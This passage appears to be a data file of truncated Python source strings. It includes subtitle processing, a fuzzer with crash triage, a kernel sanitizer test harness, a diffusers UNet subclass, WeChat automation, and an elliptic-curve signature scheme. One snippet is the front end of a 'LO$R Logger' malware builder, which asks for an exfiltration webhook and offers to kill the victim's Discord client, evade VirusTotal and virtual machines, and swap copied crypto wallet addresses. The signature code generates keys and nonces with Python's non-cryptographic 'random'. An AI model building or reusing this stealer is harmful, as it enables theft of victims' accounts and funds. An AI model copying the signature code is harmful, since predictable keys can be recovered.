tt_s / len(all_str) * ftd\n        t_end = tt_e / len(all_str) * ftd\n        t_start = round(t_start, 3)\n        t_end = round(t_end, 3)\n\n        rec_s = await second2time(ft1 + t_start)\n        rec_e = await second2time(ft1 + t_end)\n\n        cc = (f\"{rec_s} --> {rec_e}\", z)\n        line_srt.append(cc)\n\n        tt_s = tt_e + 1\n\n    return line_srt\n\n\nasync def load_srt_new(filename, flag=True):\n    time_format = r\"(\\d{2}:\\d{2}:\\d{2}),\\d{3} --> (\\d{2}:\\d{2}:\\d{2}),\\d{3}\"\n\n    n = 0  # srt \u6587\u4ef6\u603b\u884c\u6570\n    index = 0  # strs \u6587\u5b57\u4e32\u79fb\u52a8\u4e0b\u6807\n    line_tmp = \"\"  # \u6bcf\u4e2a\u65f6\u95f4\u533a\u95f4\u540e\u7684\u5b57\u6570\u7d2f\u8ba1\n    count_tmp = 0  # \u6bcf\u4e2a\u65f6\u95f4\u533a\u95f4\u540e\u7684\u5b57\u6570\u884c\u8ba1\u6570\n    new_srt = []\n\n    async with aiofiles.open(filename, mode=\"r\", encoding=\"utf-8\") as f3:\n        f_lines = await f3.readlines()\n        for line in f_lines:\n            line = line.strip(\"\\n\")\n\n            n += 1\n\n            # \u5199\u5165\u65b0\u7684\u6570\u636e\n            #   1)\u5f53\u51fa\u73b0\u5728\u6587\u672c\u672b\u5199\u5165\u4e00\u6b21\n            if n == len(f_lines):\n                new_srt_line = await spilt_str2(line_tmp, t_line_cur)\n                new_srt.append(new_srt_line)\n\n            #   2\uff09\u5f53\u65b0\u7684\u4e00\u884c\u662f\u6570\u5b57\u65f6\uff0csrt\u8bed\u53e5\u6bb5\u5199\u5165\n            # case1: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u4e0d\u662f\u6570\u5b57\n            if line.isdigit():\n                if flag:\n                    print(line)\n                if n > 1:\n                    new_srt_line = await spilt_str2(line_tmp, t_line_cur)\n                    new_srt.append(new_srt_line)\n                continue\n\n            # case2: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u4e0d\u662f\u65f6\u95f4\u6bb5\n            if re.match(time_format, line):\n                t_line_cur = line\n\n                # reset line_tmp\n                line_tmp = \"\"\n                count_tmp = 0\n                continue\n\n            # case3: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u7a7a\u683c\u65f6\n            if len(line) == 0:\n                continue\n\n            # case4: \u65b0\u7684\u4e00\u884c\u4e0d\u5c5e\u4e8e\u4e0a\u9762\u5176\u4e2d\u4e4b\u4e00\n            line_std = line.replace(\" \", \"\")\n            if flag:\n                print(f\"{line}\\n{line_std}\")\n\n            if count_tmp:\n                line_tmp += \" \" + line_std\n            else:\n                line_tmp += line_std\n            count_tmp += 1\n\n    srt = []\n    for _line in new_srt:\n        for _l in _line:\n            srt.append(_l)\n\n    return srt\n\n\nasync def save_srt(filename, srt_list):\n    async with aiofiles.open(filename, mode=\"w\", encoding=\"utf-8\") as f:\n        for _li, _l in enumerate(srt_list):\n            if _li == len(srt_list) - 1:\n                info = \"{}\\n{}\\n{}\".format(_li + 1, _l[0], _l[1])\n            else:\n                info = \"{}\\n{}\\n{}\\n\\n\".format(_li + 1, _l[0], _l[1])\n            await f.write(info)\n\n\nasync def srt_regen_new(f_srt, f_save, flag):\n",
    "import os\r\nimport pygame\r\nimport pystyle\r\nimport random\r\nimport shutil\r\nimport subprocess\r\nimport sys\r\nimport time\r\nfrom json import load\r\nfrom urllib.request import urlopen\r\nfrom zlib import compress\r\nimport requests\r\nfrom alive_progress import alive_bar\r\nfrom colorama import Fore, Style, init\r\n\r\nos.system(f'cls & title LO$R Logger v2 Builder!')\r\n\r\n\r\nbanner = (\"\"\"\r\n /$$        /$$$$$$     /$$    /$$$$$$$        /$$                                                        \r\n| $$       /$$__  $$  /$$$$$$ | $$__  $$      | $$                                                        \r\n| $$      | $$  \\ $$ /$$__  $$| $$  \\ $$      | $$        /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ \r\n| $$      | $$  | $$| $$  \\__/| $$$$$$$/      | $$       /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$\r\n| $$      | $$  | $$|  $$$$$$ | $$__  $$      | $$      | $$  \\ $$| $$  \\ $$| $$  \\ $$| $$$$$$$$| $$  \\__/\r\n| $$      | $$  | $$ \\____  $$| $$  \\ $$      | $$      | $$  | $$| $$  | $$| $$  | $$| $$_____/| $$      \r\n| $$$$$$$$|  $$$$$$/ /$$  \\ $$| $$  | $$      | $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$      \r\n|________/ \\______/ |  $$$$$$/|__/  |__/      |________/ \\______/  \\____  $$ \\____  $$ \\_______/|__/      \r\n                     \\_  $$_/                                      /$$  \\ $$ /$$  \\ $$                    \r\n                       \\__/                                       |  $$$$$$/|  $$$$$$/                    \r\n                                                                   \\______/  \\______/                                                                                          \r\n                                                                    made by ! LO$R#0001\\n\"\"\")\r\nv2 = (\"\"\"\r\n             /$$$$$$ \r\n            /$$__  $$\r\n /$$    /$$|__/  \\ $$\r\n|  $$  /$$/  /$$$$$$/\r\n \\  $$/$$/  /$$____/ \r\n  \\  $$$/  | $$      \r\n   \\  $/   | $$$$$$$$\r\n    \\_/    |________/\r\n                     \"\"\")\r\n\r\ninit()\r\n\r\nGREEN = Fore.GREEN\r\nRED = Fore.RED\r\nRESET = Style.RESET_ALL\r\n\r\nrows, columns = shutil.get_terminal_size()\r\n\r\npadding = (columns - len(v2.split(\"\\n\")[1])) // 2\r\n\r\nprint(GREEN + banner + RESET)\r\n\r\nprint(RED + (\" \" * padding) + v2 + RESET)\r\n\r\nmusic_dir = \"assets/music\"\r\nmusic_files = os.listdir(music_dir)\r\ncurrent_song = random.choice(music_files)\r\n\r\npygame.mixer.init()\r\npygame.mixer.music.load(os.path.join(music_dir, current_song))\r\nsong_title = os.path.splitext(current_song)[0]\r\n\r\nprint(f\"{Fore.GREEN}Now Playing: {Fore.RESET}{song_title}\")\r\npygame.mixer.music.play()\r\n\r\nclass Builder:\r\n    def __init__(self) -> None:\r\n        if not self.check():\r\n            exit()\r\n\r\n        self.webhook = input(\r\n            f\"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your webhook: \"\r\n        )\r\n        if not self.check_webhook(self.webhook):\r\n            print(\r\n                f\"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}\"\r\n            )\r\n            str(\r\n                input(\r\n                    f\"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit...\"\r\n                )\r\n            )\r\n            sys.exit()\r\n\r\n        self.filename = input(\r\n            f\"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your custom output .exe name: \"\r\n        )\r\n\r\n        self.killprocess = input(\r\n            f\"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Kill victim Discord Client? (yes/no): \"\r\n        )\r\n        if self.killprocess.lower() == \"y\" or self.killprocess.lower() == \"yes\":\r\n            self.killprocess = True\r\n        else:\r\n            self.killprocess = False\r\n\r\n        self.dbugkiller = input(\r\n            f\"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enable Anti-Debug (Recommend yes, Kill Virus-Total Machines / Virtual Machines or other)? (yes/no): \"\r\n        )\r\n        if self.dbugkiller.lower() == \"y\" or self.dbugkiller.lower() == \"yes\":\r\n            self.dbugkiller = True\r\n        else:\r\n            self.dbugkiller = False\r\n\r\n        self.ping = input(\r\n            f\"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping on new victim? (yes/no): \"\r\n        )\r\n        if self.ping.lower() == \"y\":\r\n            self.ping = \"yes\"\r\n        if self.ping.lower() == \"yes\":\r\n            self.ping = \"yes\"\r\n            self.pingtype = input(\r\n                f\"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping type? (here/everyone): \"\r\n            ).lower()\r\n            if self.pingtype not in [\"here\", \"everyone\"]:\r\n                self.pingtype == \"here\"\r\n        else:\r\n            self.ping = \"no\"\r\n            self.pingtype = \"none\"\r\n\r\n        self.address_replacer = input(\r\n            f\"{Fore.CYAN}[{Fore.RESET}NEW{Fore.CYAN}]{Fore.RESET} Replace all copied crypto address wallet by your address ? (yes/no): \"\r\n        )\r\n        if self.address_replacer.lower() == \"yes\":\r\n            self.address_replacer = \"yes\"\r\n            self.btc_address = input(\r\n                f\"{Fore.GREEN}[{F",
    "import pykd\r\nimport datetime\r\nimport os\r\nimport random\r\nimport multiprocessing\r\nimport shutil\r\n\r\ndef mutate_files(target_program):\r\n    print(\"\\n\\t[+] FILE MUTATOR [+]\\t\\n\")\r\n\r\n    target_folder = f\".\\\\testcases\\\\{target_program}\"\r\n    os.makedirs(target_folder, exist_ok=True)\r\n\r\n    num_fuzz_corpus = int(input(\"Enter the number of fuzz corpus: \"))\r\n\r\n    testcases_per_corpus = []\r\n\r\n    for i in range(num_fuzz_corpus):\r\n        num_testcases = int(input(f\"Enter the number of testcases for fuzz corpus {i+1}: \"))\r\n        testcases_per_corpus.append(num_testcases)\r\n\r\n    input_files = []\r\n    for i in range(num_fuzz_corpus):\r\n        input_file = input(f\"Enter the path of fuzz corpus {i+1}: \")\r\n        input_files.append(input_file)\r\n\r\n    extension_type = input(\"Enter the extension of output: \")\r\n\r\n    for i, num_testcases in enumerate(testcases_per_corpus):\r\n        corpus_folder = f\"{target_folder}\\\\corpus_{i+1}\\\\\"\r\n        os.makedirs(corpus_folder, exist_ok=True)\r\n        input_file = input_files[i]\r\n        \r\n        print(f\"\\nCorpus {i+1}:\")\r\n        print(f\"Number of Test Cases: {num_testcases}\")\r\n\r\n        for testcase_index in range(1, num_testcases + 1):\r\n            output_file = f\"{corpus_folder}\\\\testcase_{i+1}_{testcase_index}.{extension_type}\"\r\n            mutationTypes = [\"ab\", \"bd\", \"bf\", \"bi\", \"br\", \"bp\", \"bed\", \"ber\", \"sr\", \"ld\", \"lds\", \"lr2\", \"li\", \"ls\", \"lis\", \"ui\", \"num\", \"fo\", \"fn\"]\r\n            number_of_elements_to_choose = random.randint(1, 19)\r\n            random.shuffle(mutationTypes)\r\n            selected_elements = mutationTypes[:number_of_elements_to_choose]\r\n            result = \",\".join(selected_elements)\r\n            command = f\"radamsa.exe -m {result} {input_file} > {output_file}\"\r\n            os.system(command)\r\n            print(f\"Mutation type for testcase {testcase_index}: {result}\")\r\n            print(f\"Output saved to: {output_file}\\n\")\r\n\r\n    total_testcases = sum(testcases_per_corpus)\r\n    print(f\"\\n\\n[+] Testcases saved successfully.\")\r\n    print(f\"Total testcases: {total_testcases}\\n\\n\\n\")\r\n    main()\r\n\r\n\r\nclass ExceptionHandler(pykd.eventHandler):\r\n    def __init__(self):\r\n        pykd.eventHandler.__init__(self)\r\n        self.accessViolationOccured = False\r\n        self.bOver=0\r\n        self.address = 0\r\n        self.type = 0\r\n        self.code = 0\r\n    def onException(self, exceptInfo):        \r\n        print(\"[+] Exception code {}\\n\".format(hex(exceptInfo.exceptionCode)))\r\n\r\n        self.accessViolationOccured = exceptInfo.exceptionCode == 0xC0000005\r\n       \r\n        if self.accessViolationOccured:\r\n            self.bOver = 1\r\n            self.type = exceptInfo.parameters[0]\r\n            self.address = exceptInfo.parameters[1]\r\n            self.code = exceptInfo.exceptionCode\r\n            return pykd.eventResult.Break\r\n\r\n        if exceptInfo.firstChance:\r\n            return pykd.eventResult.NoChange\r\n\r\n        return pykd.eventResult.Break\r\n\r\n\r\n\r\ndef windbg_monitr(target_program):\r\n    \r\n    print(\"\\n\\t[+] Welcome to WinDBG Monitor [+]\\n\")\r\n    print(\"\\n\\tUsage:\\t Enter <target program>\\n\\t\\t Enter <argument>\\n\\n\")\r\n\r\n    process_path = input(\"\\nEnter the path of executable: \")\r\n    process_args = input(\"Please Enter the argument: \")\r\n    \r\n    log = \"\\n===============================\\nExecutable Path : \" + process_path + \"\\n\" + \"Arguments : \" + process_args + \"\\n===============================\\n\"\r\n    print(log)\r\n  \r\n    while (True):\r\n\r\n        pykd.startProcess(process_path + \" \" + process_args, pykd.ProcessDebugOptions.BreakOnStart | pykd.ProcessDebugOptions.DebugChildren)\r\n        \r\n\r\n        command = input(\"PyKD> \")\r\n        result = pykd.dbgCommand(command)\r\n        print(result)\r\n\r\n        expHandler = ExceptionHandler()\r\n\r\n        if expHandler.accessViolationOccured:\r\n            print(\"\\n[+] CRASH FOUND [+]\\n\")\r\n            logging(process_args, target_program)\r\n        elif command == \"exit\":\r\n            print(\"\\n[x] Exiting..\\n\")\r\n            main()\r\n        else:\r\n            print(\"NO CRASH HAPPEND [X]\")\r\n\r\n        \r\n    \r\n\r\n\r\ndef logging(testcase_crash_caused, target_program):\r\n        current_time = datetime.datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\r\n\r\n        log_folder = f\".\\\\logs\\\\{target_program}_logs\"\r\n        os.makedirs(log_folder, exist_ok=True)\r\n        log_path = f\"{log_folder}\\\\log_{current_time}.txt\"\r\n\r\n        pykd.loadExt(\".\\\\MSEC.dll\")\r\n        exploitable_check = pykd.dbgCommand(\"!exploitable\")\r\n        exploitable_result_str = str(exploitable_check)\r\n    \r\n        new_hash = str(exploitable_result_str.split(\"=\")[1].split(\")\")[0])    \r\n        print(f\"Major & Minor are: {new_hash}\")\r\n\r\n        g_hashes_file = \".\\\\logs\\\\unique\\\\hashes.txt\"\r\n        hashes_file = open(g_hashes_file, \"r\")\r\n        hashes_lines = hashes_file.readlines()\r\n        hashes_counter = 0\r\n        for x in hashes_lines:\r\n            if(str(new_hash + '\\n') == str(x)):\r\n                hashes_counter = hashes_counter + 1\r\n        \r\n        hashes_fi",
    "from diffusers import UNet2DConditionModel\nfrom diffusers.models.unet_2d_condition import UNet2DConditionOutput\nfrom typing import Any, Dict, List, Optional, Tuple, Union\nimport torch\nimport torch.nn as nn\nimport torch.utils.checkpoint\n\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\nfrom dataclasses import dataclass\nfrom diffusers.utils import USE_PEFT_BACKEND, BaseOutput, deprecate, logging, scale_lora_layers, unscale_lora_layers\n\n\n@dataclass\nclass CustomUNet2DConditionOutput(BaseOutput):\n    \"\"\"\n    The output of [`UNet2DConditionModel`].\n\n    Args:\n        sample (`torch.FloatTensor` of shape `(batch_size, num_channels, height, width)`):\n            The hidden states output conditioned on `encoder_hidden_states` input. Output of last layer of model.\n    \"\"\"\n\n    sample: torch.FloatTensor = None\n    multi_level_feats: [torch.FloatTensor] = None\n    sample_320: torch.FloatTensor = None\n\nclass CustomUNet2DConditionModel(UNet2DConditionModel):\n\n    def forward(\n            self,\n            sample: torch.FloatTensor,\n            timestep: Union[torch.Tensor, float, int],\n            encoder_hidden_states: torch.Tensor,\n            class_labels: Optional[torch.Tensor] = None,\n            timestep_cond: Optional[torch.Tensor] = None,\n            attention_mask: Optional[torch.Tensor] = None,\n            cross_attention_kwargs: Optional[Dict[str, Any]] = None,\n            added_cond_kwargs: Optional[Dict[str, torch.Tensor]] = None,\n            down_block_additional_residuals: Optional[Tuple[torch.Tensor]] = None,\n            mid_block_additional_residual: Optional[torch.Tensor] = None,\n            down_intrablock_additional_residuals: Optional[Tuple[torch.Tensor]] = None,\n            encoder_attention_mask: Optional[torch.Tensor] = None,\n            return_feature_only: bool = False,\n            return_dict: bool = True,\n        ) -> Union[UNet2DConditionOutput, Tuple]:\n            r\"\"\"\n            The [`UNet2DConditionModel`] forward method.\n\n            Args:\n                sample (`torch.FloatTensor`):\n                    The noisy input tensor with the following shape `(batch, channel, height, width)`.\n                timestep (`torch.FloatTensor` or `float` or `int`): The number of timesteps to denoise an input.\n                encoder_hidden_states (`torch.FloatTensor`):\n                    The encoder hidden states with shape `(batch, sequence_length, feature_dim)`.\n                class_labels (`torch.Tensor`, *optional*, defaults to `None`):\n                    Optional class labels for conditioning. Their embeddings will be summed with the timestep embeddings.\n                timestep_cond: (`torch.Tensor`, *optional*, defaults to `None`):\n                    Conditional embeddings for timestep. If provided, the embeddings will be summed with the samples passed\n                    through the `self.time_embedding` layer to obtain the timestep embeddings.\n                attention_mask (`torch.Tensor`, *optional*, defaults to `None`):\n                    An attention mask of shape `(batch, key_tokens)` is applied to `encoder_hidden_states`. If `1` the mask\n                    is kept, otherwise if `0` it is discarded. Mask will be converted into a bias, which adds large\n                    negative values to the attention scores corresponding to \"discard\" tokens.\n                cross_attention_kwargs (`dict`, *optional*):\n                    A kwargs dictionary that if specified is passed along to the `AttentionProcessor` as defined under\n                    `self.processor` in\n                    [diffusers.models.attention_processor](https://github.com/huggingface/diffusers/blob/main/src/diffusers/models/attention_processor.py).\n                added_cond_kwargs: (`dict`, *optional*):\n                    A kwargs dictionary containing additional embeddings that if specified are added to the embeddings that\n                    are passed along to the UNet blocks.\n                down_block_additional_residuals: (`tuple` of `torch.Tensor`, *optional*):\n                    A tuple of tensors that if specified are added to the residuals of down unet blocks.\n                mid_block_additional_residual: (`torch.Tensor`, *optional*):\n                    A tensor that if specified is added to the residual of the middle unet block.\n                encoder_attention_mask (`torch.Tensor`):\n                    A cross-attention mask of shape `(batch, sequence_length)` is applied to `encoder_hidden_states`. If\n                    `True` the mask is kept, otherwise if `False` it is discarded. Mask will be converted into a bias,\n                    which adds large negative values to the attention scores corresponding to \"discard\" tokens.\n                return_dict (`bool`, *optional*, defaults to `True`):\n                    Whether or not to return a [`~models.unet_2d_condition.UNet2DConditionOutput`] instead of a plain\n                    tuple.\n                cross_attention_kwa",
    "#!/usr/bin/env python3\n\nimport datetime\nimport getopt\nimport json\nimport os\nimport shutil\nimport subprocess\nimport sys\nimport time\nimport traceback\n\nfrom time import sleep\n\nKERNEL_PATH=\"/src/arch/x86/boot/bzImage\"\nSANITIZER=\"KASAN\"\nTRIGGER=\"KASAN: slab-out-of-bounds\"\nVIRTME_MODS=\"/src/.virtme_mods\"\n\ndef displayHelp():\n    print('test_blob.py --blob_bin <blob_bin> --harness_id <harness_id>')\n\n# Beginning of main\ndef main(argv):\n\n    d = datetime.datetime.now().strftime(\"%Y-%m-%d_%H:%M:%S\")\n    print(\"Start of test: {}\".format(d))\n\n    blob_bin = None\n    harness_id = None\n    try:\n        opts, args = getopt.getopt(argv, \"h:\", [\"blob_bin=\", \"harness_id=\"])\n    except getopt.GetoptError:\n        print('ERROR: parseOptions failed.')\n        displayHelp()\n        sys.exit(2)\n    for opt, arg in opts:\n        if opt == '-h':\n            displayHelp()\n            sys.exit()\n        elif opt in (\"--blob_bin\"):\n            blob_bin = arg\n        elif opt in (\"--harness_id\"):\n            harness_id = arg\n\n    if blob_bin is None:\n        print('ERROR: no blob binary.')\n        displayHelp()\n        sys.exit(2)\n\n    if not (os.path.isfile(blob_bin) and os.access(blob_bin, os.R_OK)):\n        print('ERROR: binary blob file does not exist or is not readable.')\n        displayHelp()\n        sys.exit(2)\n\n    if harness_id is None:\n        print('ERROR: no harness identifier.')\n        displayHelp()\n        sys.exit(2)\n\n    if not (os.path.isfile(harness_id) and os.access(harness_id, os.R_OK)):\n        print('ERROR: harness with supplied id does not exist or is not readable.')\n        displayHelp()\n        sys.exit(2)\n    \n    vulnBinaryFN=harness_id\n    testVulnArgs=blob_bin\n    kernelFN=KERNEL_PATH\n\n    # Delete any pre-existing vulnerability script file\n    vulnFN=vulnBinaryFN+\".sh\"\n    if os.path.isfile(vulnFN):\n        os.remove(vulnFN)\n\n    # Create the vulnerability script file that calls the vulnBinaryFN with testVulnArgs\n    try:\n        vulnFile = open(vulnFN, 'w')\n        vulnFile.write(\"#!/bin/bash\\n\")\n        vulnFile.write(vulnBinaryFN+\" \"+testVulnArgs+\"\\n\")\n        vulnFile.close()\n        os.chmod(vulnFN, 0o550)\n    except Exception:\n        print(\"Exception:\\n %s\", traceback.format_exc())\n        print(\"ERROR: failed to write vulnerability script file '{}'.\".format(vulnFN))\n        sys.exit(2)\n\n\n    print(\"virtme-run --verbose --show-boot-console --kimg {} --memory 2G --mods=auto --script-sh {} >> stdoutData 2> stderrData\".format(kernelFN, vulnFN))\n\n    stdoutData = \"\"\n    stderrData = \"\"\n    try:\n        result = subprocess.run(['virtme-run', '--verbose', '--show-boot-console', '--kimg', kernelFN, \"--memory\", \"2G\", \"--mods=auto\", \"--script-sh\", vulnFN],\n                                capture_output = True, timeout=240)\n        # Get the stdout data as a string\n        stdoutData = result.stdout.decode(\"utf-8\")\n        # Get the stderr data as a string\n        stderrData = result.stderr.decode(\"utf-8\")\n\n        if os.path.isfile(vulnFN):\n            os.remove(vulnFN)\n        if os.path.isdir(VIRTME_MODS):\n            shutil.rmtree(VIRTME_MODS)\n\n    except subprocess.TimeoutExpired as timeErr:\n        print(\"WARNING: Timeout in virtme-run\")\n        os.system('killall /usr/bin/qemu-system-x86_64')\n\n        # Try to get the stdout and stderr data as a string\n        if timeErr.stdout is not None:\n            stdoutData = timeErr.stdout.decode(\"utf-8\")\n        if timeErr.stderr is not None:\n            stderrData = timeErr.stderr.decode(\"utf-8\")\n\n        if os.path.isfile(vulnFN):\n            os.remove(vulnFN)\n        if os.path.isdir(VIRTME_MODS):\n            shutil.rmtree(VIRTME_MODS)\n\n    except Exception:\n        print(\"Unexpected Exception:\\n %s\", traceback.format_exc())\n\n        if os.path.isfile(vulnFN):\n            os.remove(vulnFN)\n        if os.path.isdir(VIRTME_MODS):\n            shutil.rmtree(VIRTME_MODS)\n\n        sys.exit(2)\n\n    logTestData = True\n    success_status = 0\n\n    if TRIGGER in stderrData:\n        print(\"TRIGGERED: Sanitizer triggered: {}\".format(TRIGGER))\n    elif \"KASAN\" in stderrData:\n        print(\"WARNING: Exemplar vuln triggered {} unexpectedly.\".format(\"KASAN\"))\n    elif \"KFENCE\" in stderrData:\n        print(\"WARNING: Exemplar vuln triggered {} unexpectedly.\".format(\"KFENCE\"))\n    elif \"UBSAN\" in stderrData:\n        print(\"WARNING: Exemplar vuln triggered {} unexpectedly.\".format(\"UBSAN\"))\n    else:\n        print(\"NO TRIGGER: No sanitizer was triggered with {}\".format(vulnBinaryFN))\n        \n    if logTestData:\n        print(\"===== VM stdout data begin =====\")\n        print(stdoutData)\n        print(\"===== VM stderr data begin =====\")\n        print(stderrData)\n        print(\"===== VM output data end =====\")\n\n    d = datetime.datetime.now().strftime(\"%Y-%m-%d_%H:%M:%S\")\n    print(\"Test complete: {}\".format(d))\n\n    return success_status\n\nif __name__ == \"__main__\":\n\n    exit_status=0\n\n    try:\n        exit_status = main(sys.argv[1:])\n    except Exception:\n        print(\"Unexpecte",
    "import random\nfrom Crypto.Hash import SHA3_256\nfrom ecpy.curves import Curve, Point\n\n\ndef egcd(a, b):\n    x, y, u, v = 0, 1, 1, 0\n    while a != 0:\n        q, r = b//a, b % a\n        m, n = x-u*q, y-v*q\n        b, a, x, y, u, v = a, r, u, v, m, n\n    gcd = b\n    return gcd, x, y\n\n\ndef modinv(a, m):\n    if a < 0:\n        a = a+m\n    gcd, x, y = egcd(a, m)\n    if gcd != 1:\n        return None  # modular inverse does not exist\n    else:\n        return x % m\n\n\ndef KeyGen(E):\n    n = E.order\n    P = E.generator\n    sA = random.randint(1, n-1)\n    QA = P*sA\n    return sA, QA\n\n\n# message, E and secret key are taken as a parameter.\ndef SignGen(message, E, sA):\n    h_obj = SHA3_256.new()\n    h_obj.update(message)\n    h2 = h_obj.hexdigest()\n    n = E.order\n    h = int(h2, 16) % n\n    k = random.randint(2, n - 1)\n    P = E.generator\n    R = k * P\n    r = R.x % n\n\n    s = (sA * r - k * h) % n\n    return s, r\n\n\ndef SignVer(message, s, r, E, QA):\n    h_obj = SHA3_256.new()\n    h_obj.update(message)\n    h2 = h_obj.hexdigest()\n    n = E.order\n    h = int(h2, 16) % n\n\n    P = E.generator\n\n    v = modinv(h, n)\n    z1 = (s * v) % n\n    z2 = (r * v) % n\n\n    z1 = n - z1\n\n    V = z1 * P + z2 * QA\n    if V.x % n == r:\n        return 0\n    else:\n        return 1\n",
    "import time\r\nimport uiautomation as auto\r\nimport subprocess\r\nimport numpy as np\r\nimport pyperclip\r\nimport os\r\nimport pyautogui\r\nimport sys\r\n\r\nfrom PIL import ImageGrab\r\n# from clipboard import setClipboardFiles\r\nfrom PyQt5.QtWidgets import QApplication\r\nfrom PyQt5.QtCore import QMimeData, QUrl\r\nfrom typing import List\r\n\r\nfrom WechatLocale import WeChatLocale\r\n\r\n\r\n# \u9f20\u6807\u79fb\u52a8\u5230\u63a7\u4ef6\u4e0a\r\ndef move(element):\r\n    x, y = element.GetPosition()\r\n    auto.SetCursorPos(x, y)\r\n\r\n\r\n# \u9f20\u6807\u5feb\u901f\u70b9\u51fb\u63a7\u4ef6\r\ndef click(element):\r\n    x, y = element.GetPosition()\r\n    auto.Click(x, y)\r\n\r\n\r\n# \u9f20\u6807\u53f3\u952e\u70b9\u51fb\u63a7\u4ef6\r\ndef right_click(element):\r\n    x, y = element.GetPosition()\r\n    auto.RightClick(x, y)\r\n\r\n\r\n# \u9f20\u6807\u5feb\u901f\u70b9\u51fb\u4e24\u4e0b\u63a7\u4ef6\r\ndef double_click(element):\r\n    x, y = element.GetPosition()\r\n    auto.SetCursorPos(x, y)\r\n    element.DoubleClick()\r\n\r\n\r\n# \u5fae\u4fe1\u7684\u63a7\u4ef6\u4ecb\u7ecd\u3002\u6ce8\u610f\"depth\"\u662f\u76f4\u63a5\u8c03\u7528auto\u8fdb\u884c\u63a7\u4ef6\u641c\u7d22\u7684\u6df1\u5ea6\uff08\u89c1\u51fd\u6570\u5185\u90e8\u4ee3\u7801\u793a\u4f8b\uff09\r\n# \u4ee5\u7fa4\u540d\u201c\u6d4b\u8bd5\u201d\u4e3a\u4f8b\uff1a\r\n# \u5de6\u4fa7\u804a\u5929\u5217\u8868\u201c\u6d4b\u8bd5\u201d\u7fa4               Name: '\u6d4b\u8bd5'     ControlType: ListItemControl    depth: 10\r\n# \u5de6\u4fa7\u804a\u5929\u5217\u8868\u201c\u6d4b\u8bd5\u201d\u7fa4               Name: '\u6d4b\u8bd5'     ControlType: ButtonControl      depth: 12\r\n# \u8fdb\u5165\u201c\u6d4b\u8bd5\u201d\u7fa4\u754c\u9762\u4e4b\u540e\u4e0a\u65b9\u7684\u7fa4\u540d       Name: '\u6d4b\u8bd5'     ControlType: ButtonControl      depth: 14\r\n# \u201c\u6d4b\u8bd5\u201d\u7fa4\u754c\u9762\u7684\u5185\u5bb9\u6846               Name: '\u6d88\u606f'     ControlType: ListControl        depth: 12\r\n# \u804a\u5929\u754c\u9762\u7684\u804a\u5929\u8bb0\u5f55\u6309\u94ae              Name: '\u804a\u5929\u8bb0\u5f55'   ControlType: ButtonControl      depth: 14\r\n# \u804a\u5929\u8bb0\u5f55\u754c\u9762\u7684\u56fe\u7247\u6309\u94ae              Name: '\u56fe\u7247\u4e0e\u89c6\u9891'     ControlType: TabItemControl      depth: 6\r\n# \u804a\u5929\u8bb0\u5f55\u590d\u5236\u56fe\u7247\u6309\u94ae               Name: '\u590d\u5236'   ControlType: MenuItemControl      depth: 5\r\n\r\n\r\nclass WeChat:\r\n    def __init__(self, path, locale=\"zh-CN\"):\r\n        # \u5fae\u4fe1\u6253\u5f00\u8def\u5f84\r\n        self.path = path\r\n        \r\n        # \u7528\u4e8e\u590d\u5236\u5185\u5bb9\u5230\u526a\u5207\u677f\r\n        self.app = QApplication([])\r\n        \r\n        # \u81ea\u52a8\u56de\u590d\u7684\u8054\u7cfb\u4eba\u5217\u8868\r\n        self.auto_reply_contacts = []\r\n        \r\n        # \u81ea\u52a8\u56de\u590d\u7684\u5185\u5bb9\r\n        self.auto_reply_msg = \"[\u81ea\u52a8\u56de\u590d]\u60a8\u597d\uff0c\u6211\u73b0\u5728\u6b63\u5728\u5fd9\uff0c\u7a0d\u540e\u4f1a\u4e3b\u52a8\u8054\u7cfb\u60a8\uff0c\u611f\u8c22\u7406\u89e3\u3002\"\r\n        \r\n        self.lc = WeChatLocale(locale)\r\n        \r\n    # \u6253\u5f00\u5fae\u4fe1\u5ba2\u6237\u7aef\r\n    def open_wechat(self):\r\n        subprocess.Popen(self.path)\r\n    \r\n    # \u641c\u5bfb\u5fae\u4fe1\u5ba2\u6237\u7aef\u63a7\u4ef6\r\n    def get_wechat(self):\r\n        return auto.WindowControl(Depth=1, Name=self.lc.weixin)\r\n    \r\n    # \u641c\u7d22\u6307\u5b9a\u7528\u6237\r\n    def get_contact(self, name):\r\n        self.open_wechat()\r\n        self.get_wechat()\r\n        \r\n        search_box = auto.EditControl(Depth=8, Name=self.lc.search)\r\n        click(search_box)\r\n        \r\n        pyperclip.copy(name)\r\n        auto.SendKeys(\"{Ctrl}v\")\r\n        # \u7b49\u5f85\u5ba2\u6237\u7aef\u641c\u7d22\u8054\u7cfb\u4eba\r\n        time.sleep(0.1)\r\n        search_box.SendKeys(\"{enter}\")\r\n    \r\n    # \u9f20\u6807\u79fb\u52a8\u5230\u53d1\u9001\u6309\u94ae\u5904\u70b9\u51fb\u53d1\u9001\u6d88\u606f\r\n    def press_enter(self):\r\n        # \u83b7\u53d6\u53d1\u9001\u6309\u94ae\r\n        send_button = auto.ButtonControl(Depth=15, Name=self.lc.send)\r\n        click(send_button)\r\n    \r\n    # \u5728\u6307\u5b9a\u7fa4\u804a\u4e2d@\u4ed6\u4eba\uff08\u82e5@\u6240\u6709\u4eba\u9700\u5177\u5907@\u6240\u6709\u4eba\u6743\u9650\uff09\r\n    def at(self, name, at_name):\r\n        self.get_contact(name)\r\n        \r\n        # 